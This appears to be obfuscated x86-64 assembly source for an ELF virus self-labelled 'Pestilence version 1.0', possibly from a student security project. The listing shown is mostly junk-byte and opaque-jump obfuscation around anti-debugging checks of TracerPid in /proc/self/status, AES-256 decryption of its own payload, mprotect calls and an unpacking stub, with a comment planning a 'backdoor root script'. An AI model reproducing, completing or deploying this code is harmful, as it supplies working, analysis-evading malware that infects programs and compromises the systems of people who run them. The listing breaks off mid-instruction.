; REGISTERS : %m6, %m7, %m8, %vsp
; Do not touch those registers as they contain sensitive data
; about different memory pages addresses.

; TODO: Add the new backdoor root script

%include "inc.asm"

DEFAULT rel
GLOBAL _start

SECTION .text

    nop
_start:
    nop
    call        _virus

align 16
_signature:
    .start: db "Pestilence version 1.0 (c)oded by mamaurai:xchalle - "
    .startsize: equ $-.start
    .index: times 4 db 0x00
    db ':'
    .key_preview: times 8 db 0x30
    db 0x00
align 16
_eos:

;- GLOBAL variables ----------------------------------
signature_len: equ _eos-_signature
non_packed_len: equ _packed-_start
virus_len: dd 0x00000000
entrypoint: dq 0x0000000000000000
;-----------------------------------------------------
; PUBLIC PART (This part isn't encrypted or packed).
_public:
;-----------------------------------------------------
; Public Structures (Structures used by public
; functions).
struc _AESD_OFF
    .key_exp    resb 0x100
    .startaddr  resq 0x1
    .length     resq 0x1
    .keyaddr    resq 0x1
endstruc
struc _UEC_OFF
    .mapaddr    resq 0x1
    .key        resb 0x20
endstruc
;-----------------------------------------------------
; Public Preprocessor Values.
tracerline_size: equ 11
columns_size: equ 7
lines_size: equ 5
debugging_size: equ 23
;-----------------------------------------------------
; Public Variables.
VARIABLES public
columns:        db "COLUMNS", 0x0
lines:          db "LINES", 0x0
procself:       db "/proc/self/status", 0x0
tracerline:     db "TracerPid:", 0x9
debugging:      db "[DEBUGGER IS RUNNING..]"
non_encrypted_len: equ _decrypt-_start
key: times 32 db 0x00
;-----------------------------------------------------
; Public code.
;-----------------------------------------------------
_virus:
    jmp         ..@PoXkwcR317GV
..@dK6zliH6EvZb:
    mov         rdi, rdi
    js          ..@zfFC3fWkgYg0
    jns         ..@zfFC3fWkgYg0
..@JxtQeTLmP0nB:
%ifndef ENABLE_DEBUGGING
    add         rsp, bytes
%endif
    jmp         $+3
db 0xa6
    js          ..@3Tf1eMoeE0Eq
    jns         ..@3Tf1eMoeE0Eq
..@1AbdB7U4ZObS:
    mov         rdi, rdi
    jmp         $+5
db 0xa3, 0x4e, 0x43
    jmp         $+3
db 0xe7
    jmp         ..@chbtFswvDGwe
..@EN7T6VAPyXI8:
    jnz         ..@afYHiuFrg8bv
    jmp         $+3
db 0xc6
    jmp         $+5
db 0x3d, 0x77, 0x5e
    jmp         $+5
db 0xcc, 0xa8, 0x15
    jmp         ..@oQCE90meWcZK
..@84kQiiekP4PN:
    movdqu      xmm2, OWORD [r2+rax]
    jmp         ..@kii9LhsRmapS
..@8uDV02jRe42T:
    aesimc      xmm0,xmm1
    jmp         $+3
db 0x6f
    jmp         ..@gETQFLN5znOs
..@Amx6M9IyZUrj:
    xor         r3, r3
    jl          ..@cHIfP6le5GPq
    jge         ..@cHIfP6le5GPq
..@AdXQlaVvKQzh:
    pop         rsi
    js          ..@aIf7kWrMl72A
    jns         ..@aIf7kWrMl72A
..@8ioGixrBkM7A:
    mov         rbp, rbp
    je          GetEnv
    jne         GetEnv
..@yZD0k44tVdNy:
    call        Strlen
    jb          ..@9tVOBIKQvOOt
    jae         ..@9tVOBIKQvOOt
..@In6yih2NQoXJ:
    movdqu      [rsi+rcx], xmm0
    jb          ..@fDnPSmGF1aPI
    jae         ..@fDnPSmGF1aPI
..@Deq87jtytB2q:
    push        rcx
    jmp         $+3
db 0x50
    jmp         $+3
db 0xcf
    jmp         ..@Djwuqtved567
..@paPZsmvjPMDr:
%ifndef ENABLE_DEBUGGING
    mov         rbp, rbp
%endif
    jmp         $+4
db 0xba, 0xe3
    js          ..@IizSJ1JARtWT
    jns         ..@IizSJ1JARtWT
..@08UKCNyrMsci:
%ifndef ENABLE_DEBUGGING
    mov         r1, 0x1
%endif
    jb          ..@LbEvs7UZrEmf
    jae         ..@LbEvs7UZrEmf
..@0ByEjUq8YaqY:
    push        rsi
    js          ..@zcbya1srnYqC
    jns         ..@zcbya1srnYqC
..@xqvnwYHAvl8e:
    mov         QWORD [rsp+_AESD_OFF.keyaddr], r3
    js          ..@hbRcLq9zRBaU
    jns         ..@hbRcLq9zRBaU
..@XdJAMNDitZyu:
    movdqu      xmm1, OWORD [rsp+0x50]
    jmp         $+4
db 0x8f, 0xc4
    jmp         ..@KNqucELBVczp
..@0NsScTaEmPR0:
    jl          ..@EvOvAhKZ1inT
    jmp         ..@iikAMPurDbXf
..@D2twKDUOwKGJ:
%ifndef ENABLE_DEBUGGING
    mov         r1, r5
%endif
    jb          ..@JAitWEYiMNXw
    jae         ..@JAitWEYiMNXw
..@yyyCl830t712:
    sub         rdx, rcx
    jmp         ..@b0sojrMqkj9C
..@k30F73XLnAdq:
    movdqu      xmm1, OWORD [rsp+0x20]
    jmp         $+5
db 0x7c, 0x9e, 0x9c
    js          ..@1wLXsdhLg9j9
    jns         ..@1wLXsdhLg9j9
..@3RRSklR3DP2K:
    push        rax
    jmp         $+5
db 0x35, 0xe8, 0xf8
    jmp         ..@hEJQGNGc7fd9
..@LXIovpBdoYM5:
%ifndef ENABLE_DEBUGGING
    xor         r3, r3
%endif
    jl          ..@Ct6NSVR3T4xP
    jge         ..@Ct6NSVR3T4xP
..@xV2O53PCxYDU:
    sub         r1, QWORD [r5]
    jmp         ..@Cd6zq4zfTYzu
..@pVzCoPjF0U5p:
%ifndef ENABLE_DEBUGGING
    mov         rdx, rdx
%endif
    jmp         $+4
db 0xda, 0xda
    jmp         ..@8ei271UnxNhR
..@FSOYh5jzpRVU:
    mov         rbp, rsp
    jmp         $+3
db 0xcc
    js          ..@3xIcguETzUMz
    jns         ..@3xIcguETzUMz
..@jdYeRmXLCflx:
    syscall
    jl          ..@ErLXOxbC782E
    jge         ..@ErLXOxbC782E
..@BdlgTTpBpeK1:
%ifndef ENABLE_DEBUGGING
    mov         r1, 17
%endif
    jb          ..@MlN5pkYBdemJ
    jae         ..@MlN5pkYBdemJ
..@UXdWOtI8OrWz:
    jmp         ..@ikjiPKpa3KjH
    js          ..@2redXI3LFX0V
    jns         ..@2redXI3LFX0V
..@ml04y5BEVNTk:
    add         r2, 1
    jmp         $+3
db 0x3f
    jmp         ..@ckPFmJZW3xkL
..@LFRbkbcF9bXK:
    pop         rdx
    jmp         ..@qUiYP3EJEkSQ
..@3xIcguETzUMz:
    sub         rsp, _AESD_OFF_size+0x100
    jmp         ..@4e0yrPk7p8fW
..@jc1Ns3bcK0qG:
%ifndef ENABLE_DEBUGGING
    xchg        rsp, rsp
%endif
    jmp         $+4
db 0xc6, 0x75
    je          ..@QYXtegKdVNZP
    jne         ..@QYXtegKdVNZP
..@Z1338huvq3yP:
    VAR         public, key
    jl          ..@ievtUw2ZBVPf
    jge         ..@ievtUw2ZBVPf
..@rAxDdSKB8ISY:
    movdqu      OWORD [r1+0x10], xmm1
    je          ..@zj1iXEvzTiEY
    jne         ..@zj1iXEvzTiEY
..@P0FXqfELJ02a:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    js          ..@PpLBpOs87EJd
    jns         ..@PpLBpOs87EJd
ExitProgram:
    jmp         ..@NRZ0z9yPTRCN
..@2KziKuJ9JLOJ:
%ifndef ENABLE_DEBUGGING
    push        rbx
%endif
    jb          ..@xzr1C49XlTiu
    jae         ..@xzr1C49XlTiu
..@ThanXD4OCPBG:
    xchg        rsi, rsi
    jmp         $+4
db 0x2c, 0x4f
    jmp         $+3
db 0x11
    jb          ..@2wpNUYc9rfcm
    jae         ..@2wpNUYc9rfcm
..@j0eDoO21JSvW:
    mov         rax, rax
    js          ..@3wn2IWZ9DzHs
    jns         ..@3wn2IWZ9DzHs
..@qcn0EdDMKIi5:
    push        rsi
    js          ..@HB9U6dkhDfTX
    jns         ..@HB9U6dkhDfTX
..@H523eM9oGFBi:
%ifndef ENABLE_DEBUGGING
    push        rsi
%endif
    jmp         $+4
db 0xeb, 0x90
    js          ..@ibj9fgYBnHiZ
    jns         ..@ibj9fgYBnHiZ
..@n4tQW1KvL5zV:
    movdqu      xmm1, OWORD [rsp+0xb0]
    js          ..@axLni2uBH8M2
    jns         ..@axLni2uBH8M2
..@AgQsJiqCdjsv:
    push        rcx
    je          ..@cAbTAI8UxVvl
    jne         ..@cAbTAI8UxVvl
..@hN1jNc3TU7GK:
%ifndef ENABLE_DEBUGGING
    sub         rax, r1
%endif
    jmp         $+5
db 0xba, 0xc2, 0x94
    jmp         $+4
db 0xf6, 0x12
    jmp         $+3
db 0xe2
    js          ..@TGGEBFJmOXRL
    jns         ..@TGGEBFJmOXRL
..@hmep54O4oNlJ:
    pop         r3
    jl          ..@ceI3LUbE7NsU
    jge         ..@ceI3LUbE7NsU
..@cLpFDIHkUegj:
    mov         rcx, QWORD [rsp]
    js          ..@VohiUT3ZaBiK
    jns         ..@VohiUT3ZaBiK
..@yo5wuMR0zNGr:
%ifndef ENABLE_DEBUGGING
    mov         r1, 16
%endif
    jmp         $+3
db 0xf8
    jl          ..@jc1Ns3bcK0qG
    jge         ..@jc1Ns3bcK0qG
..@yRYHlZFuZpBH:
    mov         r2d, DWORD [r5]
    jl          ..@QWOFVTBHhSRM
    jge         ..@QWOFVTBHhSRM
..@uzjcyCDBvhbu:
%ifndef ENABLE_DEBUGGING
    push        rax
%endif
    jmp         $+3
db 0x6d
    jb          ..@HV5oNP8Lv1sQ
    jae         ..@HV5oNP8Lv1sQ
..@Y4Cjva4FRscg:
    xchg        rsp, rsp
    js          ..@Jl8y2OJgSi2r
    jns         ..@Jl8y2OJgSi2r
..@QYXtegKdVNZP:
%ifndef ENABLE_DEBUGGING
    mov         r2, rax
%endif
    jb          ..@kyPjJdZ3DaO4
    jae         ..@kyPjJdZ3DaO4
..@rAtmxv4xHeSs:
    cmp         BYTE [r1 + rax], 0x0
    je          ..@kSMXj8uCKP8z
    jne         ..@kSMXj8uCKP8z
..@MFebVUyRb1aX:
    xchg        rsp, rsp
    jl          ..@hAc3VnImhlJs
    jge         ..@hAc3VnImhlJs
..@9lvqNlOBOB9a:
    pop         rax
    jmp         $+5
db 0x16, 0x81, 0x97
    jmp         ..@oNw6dfCvoJNu
..@4ssNL3GzIkzW:
    mov         rax, SYS_EXIT
    jmp         $+5
db 0x22, 0xc1, 0xde
    jmp         $+5
db 0x33, 0x8b, 0x23
    jmp         $+4
db 0x79, 0x05
    jmp         $+5
db 0x40, 0xee, 0xa3
    jmp         ..@QukD47FRYnPV
..@AZR2iUsvDmo2:
    jmp         DecryptExecutableCode
    jb          Strlen
    jae         Strlen
Aes256KeyExpansion:
    jmp         ..@wqy1EqVF0F9Q
..@H9Kn9KbkFKQN:
    movdqu      xmm1, OWORD [rsp+0x50]
    jmp         $+5
db 0x1e, 0x7d, 0x23
    jmp         $+3
db 0x94
    jl          ..@LTXNUpIhNRcI
    jge         ..@LTXNUpIhNRcI
..@xjyQ1lxUrcsQ:
    pop         r1
    js          ..@HS7UuAwCxOMd
    jns         ..@HS7UuAwCxOMd
..@OIUL7SuRws5r:
%ifndef ENABLE_DEBUGGING
    pop         rdx
%endif
    js          ..@JPLtMWGIOOPR
    jns         ..@JPLtMWGIOOPR
..@QdMDSBsCxqGv:
    xor         rax, rax
    jmp         $+5
db 0x28, 0xb5, 0xf0
    jmp         $+3
db 0xdd
    jb          ..@qBZs9IDXvXlL
    jae         ..@qBZs9IDXvXlL
..@Kd5fEHA75HWU:
    movdqu      xmm1, OWORD [rsp+0x20]
    jmp         $+5
db 0x24, 0x8d, 0x0f
    jmp         $+4
db 0x31, 0x14
    jl          ..@5ROyp9n9orBU
    jge         ..@5ROyp9n9orBU
..@NewBhtYNXUH2:
    mov         rcx, 0x8
    jmp         $+5
db 0x35, 0xf4, 0x1d
    jb          ..@OJZXoyCWsfn1
    jae         ..@OJZXoyCWsfn1
..@ropGyNaoDL1X:
%ifndef ENABLE_DEBUGGING
    pop         rbx
%endif
    jmp         $+3
db 0xcd
    js          ..@DyAg8mGiziGy
    jns         ..@DyAg8mGiziGy
..@3CjvRBO7y1u1:
    ret
    jmp         Aes256KeyExpansion
..@w0P5nSLo9NJn:
    call        ..@QD0Xbwg9GTO5
    jmp         $+5
db 0x9a, 0xfe, 0x67
    jmp         ..@WUl71BjT8UQ8
..@ikjiPKpa3KjH:
    xchg        rsp, rsp
    js          ..@A7bs9jTrRAZq
    jns         ..@A7bs9jTrRAZq
..@FSDFFFJge1uK:
    mov         rdx, rdx
    jmp         $+5
db 0x5d, 0xe5, 0x89
    jmp         $+4
db 0x85, 0x27
    jmp         ..@mkQEKVu2npre
..@9RHel4OQccHH:
    pop         rcx
    je          ..@AUlMY5uJgtm0
    jne         ..@AUlMY5uJgtm0
..@5BqMDdSZW2O7:
    VAR         public, _start
    je          ..@8vB3ZdPcpFy2
    jne         ..@8vB3ZdPcpFy2
..@I2HgDQG0lA6P:
    aeskeygenassist xmm2, xmm1, 0x0
    jmp         $+5
db 0xec, 0x05, 0xb4
    js          ..@nGIcYdUQi4WP
    jns         ..@nGIcYdUQi4WP
..@nBB5ZeiYDs0B:
    xchg        rcx, rcx
    jmp         $+5
db 0x69, 0x8a, 0x46
    jmp         ..@Z1338huvq3yP
..@aD9R5qQqYO40:
    sub         rdi, 1
    jmp         $+3
db 0xcc
    jmp         ..@dFA33r03lTAe
..@D41utR90PQWG:
    push        rdi
    jmp         $+4
db 0xa2, 0x53
    jmp         $+4
db 0xe8, 0x4b
    jb          ..@Ua31i3GwGu0r
    jae         ..@Ua31i3GwGu0r
..@qSXjnuZsRsL2:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jmp         $+4
db 0x2c, 0x6c
    jl          ..@bkb1y192xz42
    jge         ..@bkb1y192xz42
..@bDUY1jBuOtZ6:
%ifndef ENABLE_DEBUGGING
    push        rbx
%endif
    jb          ..@ropGyNaoDL1X
    jae         ..@ropGyNaoDL1X
..@PoJVb72n6Zet:
%ifndef ENABLE_DEBUGGING
    jl          ..@rdSWUyV7Ac2q
%endif
    jmp         $+5
db 0xa1, 0xf3, 0x99
    jmp         $+4
db 0x4b, 0x21
    js          ..@Bs0juEKfe9u5
    jns         ..@Bs0juEKfe9u5
..@8T0sMCceoMwT:
    mov         rcx, rcx
    js          ..@Ycq7UDBYIP1z
    jns         ..@Ycq7UDBYIP1z
..@mkoJ6tJk6Tn8:
    sub         rdi, 0x5
    js          ..@ImB4FLghi592
    jns         ..@ImB4FLghi592
..@y9vjq2tU6YbF:
    rep         nop
    js          ..@EvOvAhKZ1inT
    jns         ..@EvOvAhKZ1inT
..@byRiL3CBhFnv:
%ifndef ENABLE_DEBUGGING
    push        rdx
%endif
    jmp         $+4
db 0x5a, 0x26
    js          ..@uqy2P4hxFgKw
    jns         ..@uqy2P4hxFgKw
..@T7OlB3lWGB51:
    pop         rbx
    js          ..@kiEtHmE8Eueb
    jns         ..@kiEtHmE8Eueb
..@3LCJz5jhnRq6:
    pxor        xmm1, xmm3
    jl          ..@8gVsHKJXlWBF
    jge         ..@8gVsHKJXlWBF
..@TMdv28EPuGUe:
    pop         rdi
    jmp         ..@hGf6ldFfgNs3
..@uzjaQeumtrh0:
    pop         rbx
    jmp         ..@lkyGTHBCQqhx
..@2sASXViddTOO:
    mov         rbx, rbx
    jb          ..@zyChQdULwUO9
    jae         ..@zyChQdULwUO9
..@7GQAEscPKPcC:
    pop         rsi
    jmp         $+5
db 0xed, 0x2d, 0xb6
    jl          ..@y19AgiuviGjl
    jge         ..@y19AgiuviGjl
..@9PMCtyHT54EH:
    mov         rcx, rcx
    jb          ..@TfByHJpaLjfE
    jae         ..@TfByHJpaLjfE
..@zHAnTgkIR5WB:
    xchg        rdx, rdx
    jmp         $+4
db 0xfd, 0x65
    jb          ..@kMao8RNq6diW
    jae         ..@kMao8RNq6diW
..@u5a8j1dqkWe5:
    movdqa      OWORD [rsi+0xa0], xmm1
    jmp         $+5
db 0x21, 0x3f, 0x72
    jb          ..@I2HgDQG0lA6P
    jae         ..@I2HgDQG0lA6P
..@AV01x1qsF0DY:
    je          ..@AZR2iUsvDmo2
    jmp         ..@oZRhiGbRGVC3
..@tyIutCsK9u0g:
    pop         rdi
    jmp         ..@omXH1tlrqihu
..@aCn3mnm4X7Kk:
    pop         rdx
    jmp         $+5
db 0x2b, 0xc3, 0x58
    jmp         ..@PC1HfYMlvi6L
..@KzUu5eRfoG4b:
    test        r5, r5
    jmp         $+5
db 0xfb, 0xb8, 0x5f
    jmp         ..@RkkyDAFF6Z37
..@1TBwnYzWZ0lh:
    mov         rbp, rbp
    jb          ..@1G2oOdeQazvQ
    jae         ..@1G2oOdeQazvQ
..@HfeyqoRHpg91:
%ifndef ENABLE_DEBUGGING
    pop         rbx
%endif
    jmp         ..@1bT76qeBdURZ
..@Po25kRm1OWyB:
    movdqu      xmm1, OWORD [rsp+0xc0]
    jmp         $+5
db 0x88, 0x5d, 0xc7
    jl          ..@w47DPjxUj4Gz
    jge         ..@w47DPjxUj4Gz
..@UNQVh9kn809c:
    pop         r2
    js          ..@UnXyRN2aSeQb
    jns         ..@UnXyRN2aSeQb
..@jpbywQjDcJdC:
    pop         rdi
    jmp         $+5
db 0x91, 0xa3, 0xd5
    jmp         ..@peW0T1dbgrPq
..@Va2HqIrDQNvU:
    ret
    jmp         ..@KMAZPkFFQBCY
..@zfFC3fWkgYg0:
    movdqu      OWORD [rsp+0x50],xmm0
    jmp         ..@1zhxnjMP4SOp
..@K5Ovxsfhy7JU:
%ifndef ENABLE_DEBUGGING
    rep         nop
%endif
    jmp         $+3
db 0xf9
    jmp         $+5
db 0x1b, 0x2d, 0x4c
    jmp         $+5
db 0x1f, 0xdc, 0xe7
    jmp         ..@6dyGuMLAeG3G
..@vgieizHjRCaK:
%ifndef ENABLE_DEBUGGING
    mov         rbx, rbx
%endif
    jl          ..@qqnFKrzdTAec
    jge         ..@qqnFKrzdTAec
..@kxWCopCPanOY:
%ifndef ENABLE_DEBUGGING
    and         eax, 0xff00
%endif
    jmp         ..@pXakXcmI9jcx
..@KYvgZyWqEtKs:
    jmp         UnpackExecutableCode
..@Kh7zomFDZKtb:
%ifndef ENABLE_DEBUGGING
    push        rsi
%endif
    jmp         $+4
db 0x8e, 0x00
    jmp         ..@aEJNJDp3cSaI
..@94yeiJJUqYz2:
    xchg        rbx, rbx
    jl          ..@RDIOhaNy49xE
    jge         ..@RDIOhaNy49xE
..@dFA33r03lTAe:
    push        rdi
    jmp         $+4
db 0x0a, 0x2c
    js          ..@SOPRKiosvyK0
    jns         ..@SOPRKiosvyK0
..@tzNn4flbLalH:
    movdqu      xmm1, OWORD [rsp+0x80]
    js          ..@fI3TxB8TwVs3
    jns         ..@fI3TxB8TwVs3
..@ZevK5eCvMLPX:
%ifndef ENABLE_DEBUGGING
    cmp         WORD [rax], 0x0a30
%endif
    jl          ..@QdkqpgbuuSJS
    jge         ..@QdkqpgbuuSJS
..@dBEfz13Y6owH:
%ifndef ENABLE_DEBUGGING
    mov         rdi, rdi
%endif
    jmp         $+4
db 0xc1, 0xce
    js          ..@hN1jNc3TU7GK
    jns         ..@hN1jNc3TU7GK
..@A3zgG8yXggQp:
    push        rcx
    jmp         $+3
db 0x7e
    jmp         $+3
db 0xb8
    jmp         $+5
db 0xd7, 0xa3, 0x3e
    jmp         $+4
db 0xe5, 0x82
    jb          ..@fb55Vg4UCJAc
    jae         ..@fb55Vg4UCJAc
..@KNqucELBVczp:
    aesdec      xmm0, xmm1
    jmp         $+4
db 0x63, 0x8e
    jl          ..@9TheKlYqMq0i
    jge         ..@9TheKlYqMq0i
..@gWVstD5GV6Bt:
    pop         rsi
    jl          ..@I2RbK7laXR7O
    jge         ..@I2RbK7laXR7O
..@zTL7GGrj1j0N:
    push        rcx
    jmp         $+3
db 0x9c
    jb          ..@FRJFgTkajPkB
    jae         ..@FRJFgTkajPkB
..@4U9COXkwkXxU:
    push        rbx
    jmp         ..@5pR1WWMa0TlN
..@sJPwUp8VFQpD:
    xchg        rsp, rsp
    jb          ..@6tcRp8wxLuSk
    jae         ..@6tcRp8wxLuSk
..@8i7OlzT4CwVI:
    call        ..@KMAZPkFFQBCY
    jmp         ..@bcvmJTJQjcsZ
..@JZit9zAHSwd0:
    ret
    jmp         Strncmp
..@8gVsHKJXlWBF:
    add         rax, 0x20
    jmp         $+3
db 0x36
    jb          ..@QLFBm5Fsmkj1
    jae         ..@QLFBm5Fsmkj1
..@niD2tHLO7sDj:
    aeskeygenassist xmm2, xmm1, 0x0
    jmp         ..@aXYwLUfpIewN
..@g1wnOUzWaGuZ:
%ifndef ENABLE_DEBUGGING
    VAR         public, debugging
%endif
    jmp         ..@jmjDq5Q4vcyZ
..@vSwXtG8BJYJ3:
    movdqu      xmm1, OWORD [rsp+0xe0]
    js          ..@fKL1Tv6P8ozI
    jns         ..@fKL1Tv6P8ozI
..@KQW4NtiXMcAw:
    pop         rdx
    js          ..@dhmgcD3dMzCv
    jns         ..@dhmgcD3dMzCv
..@Rx4gXunsVFMU:
    movdqu      xmm1, OWORD [rsp+0xd0]
    jmp         $+4
db 0x21, 0xbd
    jmp         $+5
db 0x4c, 0x40, 0x77
    jmp         ..@sxys6rYFmXcO
..@YMJe2SFJP7h3:
%ifndef ENABLE_DEBUGGING
    push        rcx
%endif
    jmp         $+5
db 0x41, 0x7f, 0xb4
    jmp         ..@a3nz3b842o3e
..@6Su3JlBB3qnO:
%ifndef ENABLE_DEBUGGING
    pop         rcx
%endif
    jmp         ..@Z5nNDuTk42cM
..@qBZs9IDXvXlL:
    mov         eax, SYS_MPROTECT
    je          ..@jdYeRmXLCflx
    jne         ..@jdYeRmXLCflx
..@lVbQdBLeaheS:
    je          ..@2redXI3LFX0V
    je          ..@oxWhIHwjC6Fc
    jne         ..@oxWhIHwjC6Fc
..@gEwOiB5Mj6oc:
    pxor        xmm3, xmm4
    jmp         ..@a2XkL5yWPa6c
..@eYmb71aZ3DRf:
    xchg        rdi, rdi
    jmp         $+3
db 0x2b
    jmp         ..@gQILIqjg6tCC
..@wquAaKY3PumY:
    rep         nop
    jmp         $+3
db 0x77
    jmp         $+3
db 0x13
    jmp         ..@wW3Ch8DPqQH8
..@RmSiQsaAKwh3:
    jz          ..@P6mj0Rm5zzSw
    jmp         ..@4ZDNxLMlifEo
..@hbRcLq9zRBaU:
    mov         rsi, rsp
    jmp         $+3
db 0x33
    jmp         $+4
db 0x77, 0xe4
    js          ..@VAbUihIfVDSR
    jns         ..@VAbUihIfVDSR
Aes256KeyCreation:
    jmp         ..@E329RMmGUlSz
..@TlsIMYRyzFCV:
    xor         r4, r4
    jmp         $+4
db 0x0f, 0x5e
    js          ..@vFgASbm8IcXK
    jns         ..@vFgASbm8IcXK
..@KkeiAAyci2eQ:
    push        rsi
    jl          ..@5uKJmL8ZUkiz
    jge         ..@5uKJmL8ZUkiz
..@j7DCLiy4nr0r:
    pop         rdi
    jmp         $+5
db 0x25, 0x9c, 0x11
    jmp         $+4
db 0x64, 0x9e
    js          ..@1o19rFPq3Ud5
    jns         ..@1o19rFPq3Ud5
..@SOPRKiosvyK0:
    pop         rdi
    js          ..@mkoJ6tJk6Tn8
    jns         ..@mkoJ6tJk6Tn8
..@2O1PopfGXMml:
    pop         rsi
    jmp         ..@faErhaDWE6Ka
..@Hc3iXFzJP8rF:
    movdqu      xmm1, OWORD [rsp+0xa0]
    jmp         $+3
db 0x58
    jmp         $+4
db 0xd3, 0xf7
    jmp         $+4
db 0x26, 0x8c
    jmp         ..@TeNbpcB0j3sz
..@GrCueQCvK4ue:
%ifndef ENABLE_DEBUGGING
    mov         r3, debugging_size
%endif
    jmp         $+3
db 0x8e
    jmp         ..@g1wnOUzWaGuZ
..@HV5oNP8Lv1sQ:
%ifndef ENABLE_DEBUGGING
    pop         rax
%endif
    js          ..@92r6OiWIhEve
    jns         ..@92r6OiWIhEve
..@exbZwRy5TpCq:
%ifndef ENABLE_DEBUGGING
    VAR         public, tracerline
%endif
    jmp         ..@Xg6DszrG5eYr
..@e3gyWZSXVGXl:
    pslldq      xmm4, 0x4
    jmp         $+4
db 0x75, 0xdb
    jl          ..@k4vw4AoC85DI
    jge         ..@k4vw4AoC85DI
..@UPgZxeHt7HFA:
    mov         rax, r1
    jmp         ..@IfMFBYjLBnKz
..@naUNP7wVznYa:
    xchg        rsi, rsi
    jmp         ..@gLjAATnSRa17
..@vCpcugc91ha7:
    mov         rsp, rsp
    jmp         $+5
db 0xc3, 0xbd, 0xa0
    js          ..@CjXBGpH2DUFK
    jns         ..@CjXBGpH2DUFK
..@2L23SoL9dlLk:
    xchg        rdx, rdx
    jmp         ..@D1dHhDDLr1G1
..@peW0T1dbgrPq:
    xor         rax, rax
    jmp         $+3
db 0x64
    jmp         ..@4JnlKV53KezG
..@obLJA3YVy3OD:
%ifndef ENABLE_DEBUGGING
    test        rax, rax
%endif
    jmp         $+5
db 0x32, 0xcb, 0x1d
    jmp         $+5
db 0xe7, 0x4a, 0xe7
    jb          ..@Op2yaAsZ9m7a
    jae         ..@Op2yaAsZ9m7a
..@4nXornlK8ODA:
    aesimc      xmm0,xmm1
    jmp         $+5
db 0x12, 0xbb, 0x21
    je          ..@WPZQf12LFhPy
    jne         ..@WPZQf12LFhPy
..@qmrdUWwVtMPp:
%ifndef ENABLE_DEBUGGING
    xor         r4, r4
%endif
    jl          ..@5XLValRbPFSA
    jge         ..@5XLValRbPFSA
..@fI3TxB8TwVs3:
    aesimc      xmm0,xmm1
    jl          ..@ThanXD4OCPBG
    jge         ..@ThanXD4OCPBG
..@1MQwwk8YQ3Py:
%ifndef ENABLE_DEBUGGING
    lea         r2, [rsp]
%endif
    je          ..@1gosmrVizBxT
    jne         ..@1gosmrVizBxT
..@t0MX4ah5EPiL:
    xchg        rdi, rdi
    jb          ..@8b8TXLiQM4vQ
    jae         ..@8b8TXLiQM4vQ
..@22WmWf1aptQ7:
    mov         rbx, rbx
    jmp         ..@8ZSiu2GJNTU7
..@tcmfPiKHsHSV:
    pop         rbx
    jmp         $+5
db 0x0c, 0xe2, 0x2d
    jmp         $+3
db 0x7d
    jmp         ..@hmep54O4oNlJ
..@1eic9ecM99Kr:
    sub         rsp, _UEC_OFF_size
    jmp         ..@t0MX4ah5EPiL
..@9nAqFibkCfwN:
    xor         r2, r2
    jmp         ..@q6GymkzvTT28
..@GmcH5tLXXvHA:
    aesimc      xmm0,xmm1
    jmp         ..@V3UPVuk1vKP5
..@e3FkTqVTpCWx:
    push        rax
    jmp         $+5
db 0xb1, 0x6a, 0xc4
    jb          ..@qmKGkhrR6mqY
    jae         ..@qmKGkhrR6mqY
..@sHcLqcFIztru:
    mov         rbx, rbx
    jmp         $+4
db 0xfc, 0x64
    jmp         ..@V8lcN1kge7tp
..@qmKGkhrR6mqY:
    pop         rax
    jb          ..@hhIuSCu4F9mj
    jae         ..@hhIuSCu4F9mj
GetEnv:
    jmp         ..@BRaUSYVZFKnv
..@qQZKRxRm7Yyh:
    VAR         public, entrypoint
    jl          ..@xV2O53PCxYDU
    jge         ..@xV2O53PCxYDU
..@QD0Xbwg9GTO5:
    pshufd      xmm2, xmm2, 0xaa
    jmp         $+4
db 0x25, 0xd7
    jmp         $+3
db 0x45
    jmp         $+3
db 0xcb
    jb          ..@IxPYZkjxyhUX
    jae         ..@IxPYZkjxyhUX
..@oNw6dfCvoJNu:
    mov         rsi, rsi
    jl          ..@u5a8j1dqkWe5
    jge         ..@u5a8j1dqkWe5
..@RL46y2M4v7Ky:
    aesimc      xmm0,xmm1
    jb          ..@XipBy7Xnqh8f
    jae         ..@XipBy7Xnqh8f
..@F1XlmuGhI736:
    xor         r2, r2
    je          ..@Amx6M9IyZUrj
    jne         ..@Amx6M9IyZUrj
..@ybbYQkpoED3k:
    xchg        rdx, rdx
    jmp         $+3
db 0x80
    jmp         ..@hEzMeOiPqKjy
..@V8lcN1kge7tp:
    mov         rax, rax
    jmp         $+3
db 0x84
    jb          ..@fbBoOTlElOZZ
    jae         ..@fbBoOTlElOZZ
..@iOFKBMhdwukH:
    GGLOBAL     _packed
    jmp         $+3
db 0x96
    jmp         $+5
db 0x53, 0x45, 0x4c
    jb          ..@0d7NRmdWjCnV
    jae         ..@0d7NRmdWjCnV
..@EvOvAhKZ1inT:
    xor         rbx, rbx
    jmp         ..@SijYGInSC9MM
..@8tPJSwwUV64D:
    mov         rdx, QWORD [rsp]
    jmp         $+3
db 0xd6
    je          ..@yyyCl830t712
    jne         ..@yyyCl830t712
..@0JsB4gDiNrxA:
    xor         rax, rax
    jmp         $+5
db 0x2f, 0xf4, 0xc6
    jmp         ..@cJ3mqFK65NkL
..@0mlE3bORaWHP:
    mov         rbx, rbx
    je          ..@pu3HFEjo2IBb
    jne         ..@pu3HFEjo2IBb
..@qA0EVT1SBxqC:
    mov         rcx, rcx
    jl          Aes256KeyCreation
    jge         Aes256KeyCreation
..@O8zmfsgfTsvF:
%ifndef ENABLE_DEBUGGING
    xor         r3, r3
%endif
    je          ..@B1i1oFYaHoct
    jne         ..@B1i1oFYaHoct
..@LU0z6HB1j43s:
    push        rcx
    jmp         ..@MkP12NyM7GXr
..@MNj1E7rGQd1j:
    pop         rbx
    jl          ..@84kQiiekP4PN
    jge         ..@84kQiiekP4PN
..@4nVTa2mFGXci:
    mov         rsi, rsi
    jmp         ..@IsxHTLZtrFPP
..@kSMXj8uCKP8z:
    push        rdi
    jl          ..@qPLT6PgxYYkV
    jge         ..@qPLT6PgxYYkV
..@ArIMpWDOqU0r:
%ifndef ENABLE_DEBUGGING
    jnz         ..@IwuzLc8I7NYD
%endif
    jl          ..@xEAKLqOtt9ru
    jge         ..@xEAKLqOtt9ru
..@ggqP4Ny0Anvl:
    xchg        rdx, rdx
    jmp         $+4
db 0xd0, 0x8d
    je          ..@TlsIMYRyzFCV
    jne         ..@TlsIMYRyzFCV
..@Sok6D9OQmq3m:
    mov         rdx, rdx
    jmp         $+5
db 0x18, 0x9e, 0x8e
